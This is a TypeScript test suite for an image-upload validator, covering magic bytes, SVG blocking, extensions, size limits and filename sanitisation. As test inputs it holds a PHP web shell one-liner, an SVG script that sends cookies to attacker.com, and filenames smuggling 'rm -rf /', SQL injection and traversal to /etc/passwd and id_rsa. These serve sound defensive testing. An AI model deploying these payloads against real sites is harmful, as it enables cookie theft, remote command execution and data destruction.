/**
 * File Validation Tests
 *
 * Tests for comprehensive file upload security validation
 */

import {
  validateImageFile,
  quickValidate,
  sanitizeFilename,
  generateSafeFilename,
  getUserFriendlyError,
  BLOCKED_EXTENSIONS,
  FILE_SIZE_LIMITS,
} from '../fileValidation';

describe('File Validation', () => {
  describe('Magic Byte Verification', () => {
    it('should detect valid JPEG by magic bytes', async () => {
      // JPEG magic bytes: FF D8 FF
      const jpegBytes = new Uint8Array([0xFF, 0xD8, 0xFF, 0xE0, ...new Array(100).fill(0)]);
      const file = new File([jpegBytes], 'test.jpg', { type: 'image/jpeg' });

      const result = await validateImageFile(file);
      expect(result.valid).toBe(true);
      expect(result.detectedType).toBe('image/jpeg');
    });

    it('should detect valid PNG by magic bytes', async () => {
      // PNG magic bytes: 89 50 4E 47 0D 0A 1A 0A
      const pngBytes = new Uint8Array([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, ...new Array(100).fill(0)]);
      const file = new File([pngBytes], 'test.png', { type: 'image/png' });

      const result = await validateImageFile(file);
      expect(result.valid).toBe(true);
      expect(result.detectedType).toBe('image/png');
    });

    it('should reject MIME type spoofing', async () => {
      // Text file pretending to be JPEG
      const textBytes = new TextEncoder().encode('<?php system($_GET["cmd"]); ?>');
      const file = new File([textBytes], 'malicious.jpg', { type: 'image/jpeg' });

      const result = await validateImageFile(file);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('Could not verify file type');
    });

    it('should detect MIME type mismatch', async () => {
      // JPEG bytes but declared as PNG
      const jpegBytes = new Uint8Array([0xFF, 0xD8, 0xFF, 0xE0, ...new Array(100).fill(0)]);
      const file = new File([jpegBytes], 'test.jpg', { type: 'image/png' });

      const result = await validateImageFile(file);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('mismatch');
    });
  });

  describe('SVG Blocking', () => {
    it('should block SVG by extension', async () => {
      const svgContent = '<svg><circle cx="50" cy="50" r="40"/></svg>';
      const file = new File([svgContent], 'image.svg', { type: 'image/svg+xml' });

      const result = await validateImageFile(file);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('SVG');
    });

    it('should block SVG by MIME type', async () => {
      const svgContent = '<svg><script>alert("xss")</script></svg>';
      const file = new File([svgContent], 'malicious.xml', { type: 'image/svg+xml' });

      const result = await validateImageFile(file);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('SVG');
    });

    it('should block .svgz extension', async () => {
      const file = new File(['data'], 'image.svgz', { type: 'image/svg+xml' });

      const result = await validateImageFile(file);
      expect(result.valid).toBe(false);
    });
  });

  describe('Extension Validation', () => {
    it('should allow valid image extensions', () => {
      const validExtensions = ['.jpg', '.jpeg', '.png', '.gif', '.webp'];

      validExtensions.forEach(ext => {
        const file = new File(['data'], `image${ext}`, { type: 'image/jpeg' });
        const result = quickValidate(file);
        expect(result.valid).toBe(true);
      });
    });

    it('should block dangerous extensions', () => {
      const dangerousFiles = [
        'malware.exe',
        'script.js',
        'backdoor.php',
        'virus.bat',
        'trojan.sh',
        'payload.dll',
      ];

      dangerousFiles.forEach(filename => {
        const file = new File(['data'], filename, { type: 'application/octet-stream' });
        const result = quickValidate(file);
        expect(result.valid).toBe(false);
      });
    });

    it('should block double extensions', () => {
      const file = new File(['data'], 'image.jpg.exe', { type: 'image/jpeg' });
      const result = quickValidate(file);
      expect(result.valid).toBe(false);
    });
  });

  describe('File Size Validation', () => {
    it('should allow files under size limit', () => {
      const size = 2 * 1024 * 1024; // 2MB
      const data = new Uint8Array(size);
      const file = new File([data], 'image.jpg', { type: 'image/jpeg' });

      const result = quickValidate(file);
      expect(result.valid).toBe(true);
    });

    it('should block files over size limit', () => {
      const size = 10 * 1024 * 1024; // 10MB (over 5MB limit)
      const data = new Uint8Array(size);
      const file = new File([data], 'huge.jpg', { type: 'image/jpeg' });

      const result = quickValidate(file);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('size');
    });

    it('should block empty files', () => {
      const file = new File([], 'empty.jpg', { type: 'image/jpeg' });

      const result = quickValidate(file);
      expect(result.valid).toBe(false);
      expect(result.error).toContain('empty');
    });
  });

  describe('Filename Sanitization', () => {
    it('should remove path traversal attempts', () => {
      expect(sanitizeFilename('../../etc/passwd')).toBe('______etc_passwd');
      expect(sanitizeFilename('../../../root/.ssh/id_rsa')).toBe('_________root_.ssh_id_rsa');
    });

    it('should remove special characters', () => {
      expect(sanitizeFilename('file; rm -rf /')).toBe('file__rm_-rf__');
      expect(sanitizeFilename('<script>alert("xss")</script>')).toBe('_script_alert__xss___script_');
      expect(sanitizeFilename("file'; DROP TABLE users--")).toBe('file___DROP_TABLE_users__');
    });

    it('should preserve safe characters', () => {
      expect(sanitizeFilename('my-photo_2024.jpg')).toBe('my-photo_2024.jpg');
      expect(sanitizeFilename('Screenshot 2024-01-15.png')).toBe('Screenshot_2024-01-15.png');
    });

    it('should limit filename length', () => {
      const longName = 'a'.repeat(200) + '.jpg';
      const sanitized = sanitizeFilename(longName);
      expect(sanitized.length).toBeLessThanOrEqual(100);
      expect(sanitized.endsWith('.jpg')).toBe(true);
    });
  });

  describe('Safe Filename Generation', () => {
    it('should generate unique filenames', () => {
      const name1 = generateSafeFilename('image.jpg');
      const name2 = generateSafeFilename('image.jpg');

      expect(name1).not.toBe(name2); // Different due to timestamp/random
      expect(name1).toMatch(/^upload_\d+_[a-z0-9]+\.jpg$/);
    });

    it('should preserve extension', () => {
      expect(generateSafeFilename('photo.png')).toMatch(/\.png$/);
      expect(generateSafeFilename('animation.gif')).toMatch(/\.gif$/);
    });

    it('should sanitize before generating', () => {
      const malicious = generateSafeFilename('../../etc/passwd.jpg');
      expect(malicious).toMatch(/^upload_\d+_[a-z0-9]+\.jpg$/);
      expect(malicious).not.toContain('..');
    });
  });

  describe('User-Friendly Errors', () => {
    it('should return appropriate message for size error', () => {
      const result = { valid: false, error: 'File size exceeds limit' };
      expect(getUserFriendlyError(result)).toContain('too large');
    });

    it('should return appropriate message for SVG block', () => {
      const result = { valid: false, error: 'SVG files are not allowed' };
      expect(getUserFriendlyError(result)).toContain('SVG');
    });

    it('should return appropriate message for type mismatch', () => {
      const result = { valid: false, error: 'File type mismatch detected' };
      expect(getUserFriendlyError(result)).toContain('corrupted');
    });
  });

  describe('Quick Validation', () => {
    it('should provide instant feedback', () => {
      const file = new File(['data'], 'image.jpg', { type: 'image/jpeg' });
      const result = quickValidate(file);

      // Quick validation doesn't read file bytes (instant)
      expect(result).toBeDefined();
      expect(typeof result.valid).toBe('boolean');
    });

    it('should catch obvious issues without full validation', () => {
      // Too large
      const hugeFile = new File([new Uint8Array(10 * 1024 * 1024)], 'huge.jpg');
      expect(quickValidate(hugeFile).valid).toBe(false);

      // Wrong extension
      const exeFile = new File(['data'], 'virus.exe');
      expect(quickValidate(exeFile).valid).toBe(false);

      // SVG
      const svgFile = new File(['<svg/>'], 'icon.svg', { type: 'image/svg+xml' });
      expect(quickValidate(svgFile).valid).toBe(false);
    });
  });
});

describe('Security Attack Scenarios', () => {
  it('should prevent XSS via malicious SVG', async () => {
    const xssSvg = `
      <svg xmlns="http://www.w3.org/2000/svg">
        <script>
          fetch('https://attacker.com/steal?cookie=' + document.cookie);
        </script>
      </svg>
    `;

    const file = new File([xssSvg], 'image.svg', { type: 'image/svg+xml' });
    const result = await validateImageFile(file);

    expect(result.valid).toBe(false);
    expect(result.error).toContain('SVG');
  });

  it('should prevent code execution via PHP upload', async () => {
    const phpCode = '<?php system($_GET["cmd"]); ?>';
    const bytes = new TextEncoder().encode(phpCode);

    const file = new File([bytes], 'shell.php.jpg', { type: 'image/jpeg' });
    const result = await validateImageFile(file);

    // Blocked by extension (.php) or magic byte mismatch
    expect(result.valid).toBe(false);
  });

  it('should prevent path traversal', () => {
    const dangerous = '../../../../etc/passwd';
    const safe = sanitizeFilename(dangerous);

    expect(safe).not.toContain('..');
    expect(safe).not.toContain('/');
  });

  it('should prevent command injection via filename', () => {
    const dangerous = 'file.jpg; rm -rf / #';
    const safe = sanitizeFilename(dangerous);

    expect(safe).not.toContain(';');
    expect(safe).not.toContain('#');
  });
});
